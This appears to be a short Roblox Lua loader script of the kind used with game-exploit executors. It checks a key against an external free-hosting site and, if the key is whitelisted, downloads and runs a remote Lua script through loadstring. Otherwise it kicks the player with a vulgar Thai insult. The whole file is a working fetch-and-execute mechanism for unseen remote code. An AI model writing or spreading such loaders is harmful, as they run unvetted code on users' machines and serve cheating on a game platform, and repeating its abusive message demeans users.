local key = _G.Key
local check = "https://caxy.000webhostapp.com/check.php?key=" .. key
if game:HttpGet(check) == "Whitelisted" then
loadstring(game:HttpGet("https://caxy.000webhostapp.com/script.lua"))()
else
game.Players.LocalPlayer:Kick("ไอความไม่มีคีย์ แล้วรันหาพ่อมึงหรอ")
end
